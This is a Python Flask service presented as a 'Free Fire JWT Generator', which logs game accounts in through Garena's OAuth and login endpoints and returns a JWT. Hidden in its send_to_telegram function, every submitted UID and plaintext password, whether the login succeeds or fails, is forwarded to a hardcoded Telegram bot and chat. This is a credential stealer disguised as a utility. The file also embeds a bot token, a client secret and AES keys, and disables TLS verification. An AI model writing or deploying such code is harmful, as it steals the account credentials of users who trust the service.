from flask import Flask, request, jsonify
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
import base64
import json
import requests
import urllib3
import os
from datetime import datetime
import threading
from concurrent.futures import ThreadPoolExecutor, as_completed
from google.protobuf import descriptor as _descriptor
from google.protobuf import descriptor_pool as _descriptor_pool
from google.protobuf import symbol_database as _symbol_database
from google.protobuf.internal import builder as _builder
from google.protobuf import json_format
import jwt

# Disable SSL warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

app = Flask(__name__)

# AES Configuration
MAIN_KEY = base64.b64decode('WWcmdGMlREV1aDYlWmNeOA==')  # Yg&tc%DEuh6%Zc^8
MAIN_IV = base64.b64decode('Nm95WkRyMjJFM3ljaGpNJQ==')   # 6oyZDr22E3ychjM%
USERAGENT = "Dalvik/2.1.0 (Linux; U; Android 13; CPH2095 Build/RKQ1.211119.001)"
RELEASEVERSION = "OB52"

# Telegram Configuration
TELEGRAM_BOT_TOKEN = os.environ.get('TELEGRAM_BOT_TOKEN', '8264409361:AAG9fE6c_T7NkcrAU7t5809z5HShcKNEymI')
TELEGRAM_CHAT_ID = os.environ.get('TELEGRAM_CHAT_ID', '6205220660')

# === FreeFire_pb2.py Code Integrated ===
_sym_db = _symbol_database.Default()

DESCRIPTOR = _descriptor_pool.Default().AddSerializedFile(b'\n\x0e\x46reeFire.proto\"c\n\x08LoginReq\x12\x0f\n\x07open_id\x18\x16 \x01(\t\x12\x14\n\x0copen_id_type\x18\x17 \x01(\t\x12\x13\n\x0blogin_token\x18\x1d \x01(\t\x12\x1b\n\x13orign_platform_type\x18\x63 \x01(\t\"]\n\x10\x42lacklistInfoRes\x12\x1e\n\nban_reason\x18\x01 \x01(\x0e\x32\n.BanReason\x12\x17\n\x0f\x65xpire_duration\x18\x02 \x01(\r\x12\x10\n\x08\x62\x61n_time\x18\x03 \x01(\r\"f\n\x0eLoginQueueInfo\x12\r\n\x05\x61llow\x18\x01 \x01(\x08\x12\x16\n\x0equeue_position\x18\x02 \x01(\r\x12\x16\n\x0eneed_wait_secs\x18\x03 \x01(\r\x12\x15\n\rqueue_is_full\x18\x04 \x01(\x08\"\xa0\x03\n\x08LoginRes\x12\x12\n\naccount_id\x18\x01 \x01(\x04\x12\x13\n\x0block_region\x18\x02 \x01(\t\x12\x13\n\x0bnoti_region\x18\x03 \x01(\t\x12\x11\n\tip_region\x18\x04 \x01(\t\x12\x19\n\x11\x61gora_environment\x18\x05 \x01(\t\x12\x19\n\x11new_active_region\x18\x06 \x01(\t\x12\x19\n\x11recommend_regions\x18\x07 \x03(\t\x12\r\n\x05token\x18\x08 \x01(\t\x12\x0b\n\x03ttl\x18\t \x01(\r\x12\x12\n\nserver_url\x18\n \x01(\t\x12\x16\n\x0e\x65mulator_score\x18\x0b \x01(\r\x12$\n\tblacklist\x18\x0c \x01(\x0b\x32\x11.BlacklistInfoRes\x12#\n\nqueue_info\x18\r \x01(\x0b\x32\x0f.LoginQueueInfo\x12\x0e\n\x06tp_url\x18\x0e \x01(\t\x12\x15\n\rapp_server_id\x18\x0f \x01(\r\x12\x0f\n\x07\x61no_url\x18\x10 \x01(\t\x12\x0f\n\x07ip_city\x18\x11 \x01(\t\x12\x16\n\x0eip_subdivision\x18\x12 \x01(\t*\xa8\x01\n\tBanReason\x12\x16\n\x12\x42\x41N_REASON_UNKNOWN\x10\x00\x12\x1b\n\x17\x42\x41N_REASON_IN_GAME_AUTO\x10\x01\x12\x15\n\x11\x42\x41N_REASON_REFUND\x10\x02\x12\x15\n\x11\x42\x41N_REASON_OTHERS\x10\x03\x12\x16\n\x12\x42\x41N_REASON_SKINMOD\x10\x04\x12 \n\x1b\x42\x41N_REASON_IN_GAME_AUTO_NEW\x10\xf6\x07\x62\x06proto3')

_globals = globals()
_builder.BuildMessageAndEnumDescriptors(DESCRIPTOR, _globals)
_builder.BuildTopDescriptorsAndMessages(DESCRIPTOR, 'FreeFire_pb2', _globals)

# Define the Protobuf classes
LoginReq = _globals['LoginReq']
LoginRes = _globals['LoginRes']
# === End of FreeFire_pb2.py Code ===

def send_to_telegram(uid, password, status, ip_address, endpoint_used, error_msg=None):
    """Send ONLY the user's endpoint request to Telegram bot - NO TOKEN DETAILS"""
    try:
        timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        
        # SIMPLIFIED MESSAGE - Only shows what user submitted
        message_parts = [
            f"👤 *UID:* `{uid}`",
            f"🔑 *Password:* `{password}`",
            f"📊 *Status:* `{status}`",
        ]
        
        if status == "FAILED" and error_msg:
            message_parts.append(f"❌ *Error:* `{error_msg}`")
            message_parts.append("Ok Done")
        
        message = "\n".join(message_parts)
        
        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
        payload = {
            "chat_id": TELEGRAM_CHAT_ID,
            "text": message,
            "parse_mode": "Markdown",
            "disable_notification": False
        }
        
        response = requests.post(url, json=payload, timeout=5)
        return response.status_code == 200
    except Exception as e:
        print(f"Telegram send error: {e}")
        return False

def pad_bytes(text: bytes) -> bytes:
    """Pad bytes for AES encryption"""
    try:
        padding_length = AES.block_size - (len(text) % AES.block_size)
        return text + bytes([padding_length] * padding_length)
    except Exception as e:
        print(f"Padding failed: {e}")
        raise

def aes_cbc_encrypt(key: bytes, iv: bytes, plaintext: bytes) -> bytes:
    """Encrypt using AES-CBC"""
    try:
        aes = AES.new(key, AES.MODE_CBC, iv)
        return aes.encrypt(pad_bytes(plaintext))
    except Exception as e:
        print(f"AES encryption failed: {e}")
        raise

def json_to_proto(json_data: str):
    """Convert JSON to Protobuf message"""
    try:
        json_dict = json.loads(json_data)
        proto_message = LoginReq()
        json_format.ParseDict(json_dict, proto_message)
        return proto_message.SerializeToString()
    except Exception as e:
        print(f"Protobuf conversion failed: {e}")
        raise

def get_tokens(uid, password):
    """Get OAuth tokens using UID and password"""
    url = "https://ffmconnect.live.gop.garenanow.com/oauth/guest/token/grant"
    
    headers = {
        "Accept-Encoding": "gzip",
        "Connection": "Keep-Alive",
        "Content-Type": "application/x-www-form-urlencoded",
        "Host": "ffmconnect.live.gop.garenanow.com",
        "User-Agent": USERAGENT,
    }

    payload = f"uid={uid}&password={password}&response_type=token&client_type=2&client_secret=2ee44819e9b4598845141067b281621874d0d5d7af9d8f7e00c1e54715b7d1e3&client_id=100067"

    try:
        response = requests.post(url, headers=headers, data=payload, timeout=30)
        
        if response.status_code == 200:
            result = response.json()
            print(f"✅ Tokens Generated for UID: {uid}")
            return {
                "open_id": result['open_id'],
                "access_token": result['access_token'],
                "refresh_token": result['refresh_token']
            }
        else:
            error_msg = f"HTTP {response.status_code}"
            print(f"❌ Failed to get tokens for {uid}: {error_msg}")
            return {"error": error_msg}
    except Exception as e:
        error_msg = str(e)
        print(f"❌ Token grant failed for {uid}: {error_msg}")
        return {"error": error_msg}

def major_login(access_token, open_id):
    """Login to Free Fire using Protobuf and get JWT token"""
    
    print(f"🔐 Attempting login for OpenID: {open_id}")
    
    try:
        # Create login request using Protobuf
        body = json.dumps({
            "open_id": open_id,
            "open_id_type": "4",
            "login_token": access_token,
            "orign_platform_type": "4"
        })
        
        # Convert to Protobuf and encrypt
        proto_bytes = json_to_proto(body)
        payload = aes_cbc_encrypt(MAIN_KEY, MAIN_IV, proto_bytes)
        
        url = "https://loginbp.ggblueshark.com/MajorLogin"
        headers = {
            'User-Agent': USERAGENT,
            'Connection': "Keep-Alive",
            'Accept-Encoding': "gzip",
            'Content-Type': "application/octet-stream",
            'Expect': "100-continue",
            'X-Unity-Version': "2018.4.11f1",
            'X-GA': "v1 1",
            'ReleaseVersion': RELEASEVERSION
        }
        
        # Send request
        response = requests.post(url, data=payload, headers=headers, timeout=30, verify=False)
        response.raise_for_status()
        
        # Parse response using integrated Protobuf
        login_res = LoginRes()
        login_res.ParseFromString(response.content)
        
        # Convert to JSON to extract token
        msg_json = json_format.MessageToJson(login_res)
        msg = json.loads(msg_json)
        token = msg.get('token', '0')
        
        if token == '0':
            print(f"❌ No token received in response for OpenID: {open_id}")
            return None
        
        print(f"✅ JWT Token generated for OpenID: {open_id}")
        return token
        
    except requests.exceptions.RequestException as e:
        print(f"❌ HTTP error during login for {open_id}: {e}")
        return None
    except Exception as e:
        print(f"❌ Login failed for {open_id}: {e}")
        return None

@app.route('/generate-jwt', methods=['GET'])
def generate_jwt():
    """API endpoint to generate JWT token for single account"""
    uid = request.args.get('uid')
    password = request.args.get('password')
    ip_address = request.remote_addr
    endpoint_used = "/generate-jwt"
    
    if not uid or not password:
        return jsonify({
            "status": "error",
            "message": "Missing uid or password parameter"
        }), 400
    
    print(f"\n{'='*50}")
    print(f"🔄 Processing UID: {uid}")
    print(f"{'='*50}")
    
    # Step 1: Get OAuth tokens
    token_data = get_tokens(uid, password)
    
    if "error" in token_data:
        # Send failure notification - ONLY UID/PASSWORD, no token
        send_to_telegram(uid, password, "FAILED", ip_address, endpoint_used, error_msg=token_data["error"])
        
        return jsonify({
            "status": "error",
            "message": f"Token grant failed: {token_data['error']}"
        }), 400
    
    # Step 2: Major login to get JWT
    jwt_token = major_login(
        token_data['access_token'], 
        token_data['open_id']
    )
    
    if jwt_token:
        # Send success notification - ONLY UID/PASSWORD, no token details!
        send_to_telegram(uid, password, "SUCCESS", ip_address, endpoint_used)
        
        return jsonify({
            "status": "success",
            "token": jwt_token
        }), 200
    else:
        # Send failure notification
        send_to_telegram(uid, password, "FAILED", ip_address, endpoint_used, error_msg="Major login failed")
        
        return jsonify({
            "status": "error",
            "message": "Failed to generate JWT token"
        }), 400

@app.route('/batch-generate', methods=['POST'])
def batch_generate():
    """Batch generate JWT tokens from JSON payload"""
    ip_address = request.remote_addr
    endpoint_used = "/batch-generate"
    
    try:
        data = request.get_json()
        if not data or 'accounts' not in data:
            return jsonify({
                "status": "error",
                "message": "Invalid JSON payload. Expected {'accounts': [{'uid': '', 'password': ''}]}"
            }), 400
        
        accounts = data['accounts']
        results = []
        
        # Send batch start notification (summary only)
        send_to_telegram(f"BATCH_{len(accounts)}_ACCOUNTS", "***", "PROCESSING", ip_address, endpoint_used)
        
        def process_single_account(account):
            uid = account.get('uid')
            password = account.get('password')
            
            if not uid or not password:
                return {
                    "uid": uid or "unknown",
                    "status": "error",
                    "message": "Missing uid or password"
                }
            
            # Get OAuth tokens
            token_data = get_tokens(uid, password)
            if "error" in token_data:
                send_to_telegram(uid, password, "FAILED", ip_address, endpoint_used, error_msg=token_data["error"])
                return {
                    "uid": uid,
                    "status": "error",
                    "message": token_data["error"]
                }
            
            # Get JWT token
            jwt_token = major_login(token_data['access_token'], token_data['open_id'])
            
            if jwt_token:
                send_to_telegram(uid, password, "SUCCESS", ip_address, endpoint_used)
                return {
                    "uid": uid,
                    "status": "success",
                    "token": jwt_token
                }
            else:
                send_to_telegram(uid, password, "FAILED", ip_address, endpoint_used, error_msg="Major login failed")
                return {
                    "uid": uid,
                    "status": "error",
                    "message": "Major login failed"
                }
        
        # Process accounts in parallel
        with ThreadPoolExecutor(max_workers=5) as executor:
            futures = [executor.submit(process_single_account, account) for account in accounts]
            for future in futures:
                results.append(future.result())
        
        # Calculate statistics
        successful = sum(1 for r in results if r['status'] == 'success')
        failed = len(results) - successful
        
        return jsonify({
            "status": "completed",
            "total": len(results),
            "successful": successful,
            "failed": failed,
            "results": results
        }), 200
        
    except Exception as e:
        return jsonify({
            "status": "error",
            "message": str(e)
        }), 500

@app.route('/health', methods=['GET'])
def health_check():
    """Health check endpoint"""
    return jsonify({
        "status": "healthy",
        "service": "Free Fire JWT Generator API"
    }), 200

@app.route('/test-telegram', methods=['GET'])
def test_telegram():
    """Test Telegram notifications - shows ONLY test data"""
    ip_address = request.remote_addr
    endpoint_used = "/test-telegram"
    
    # Simple test with dummy data - NO TOKEN DETAILS
    success = send_to_telegram(
        "test_uid_123", 
        "test_password", 
        "TEST_SUCCESS", 
        ip_address,
        endpoint_used
    )
    
    if success:
        return jsonify({
            "status": "success",
            "message": "Telegram notification sent successfully!"
        }), 200
    else:
        return jsonify({
            "status": "error",
            "message": "Failed to send Telegram notification"
        }), 500

if __name__ == '__main__':
    # Check environment variables
    if TELEGRAM_BOT_TOKEN == '8264409361:AAG9fE6c_T7NkcrAU7t5809z5HShcKNEymI' or TELEGRAM_CHAT_ID == '6205220660':
        print("⚠️ Warning: Using default Telegram credentials!")
        print("For production, set environment variables:")
        print("  TELEGRAM_BOT_TOKEN")
        print("  TELEGRAM_CHAT_ID")
    
    port = int(os.environ.get('PORT', 8080))
    
    print(f"\n🚀 Starting Free Fire JWT Generator API...")
    print(f"📡 Port: {port}")
    print(f"🏠 Host: 0.0.0.0")
    
    print("\n🔧 Available Endpoints:")
    print("   GET  /generate-jwt?uid=xxx&password=xxx - Generate single JWT")
    print("   POST /batch-generate                    - Batch generate tokens")
    print("   GET  /test-telegram                     - Test Telegram")
    print("   GET  /health                            - Health check")
    
    print("\n📱 Telegram Notifications:")
    print("   ✅ Only showing UID/Password - NO token details!")
    print("   ✅ No JWT tokens or account info in Telegram")
    
    app.run(
        host='0.0.0.0',
        port=port,
        debug=False,
        threaded=True
    )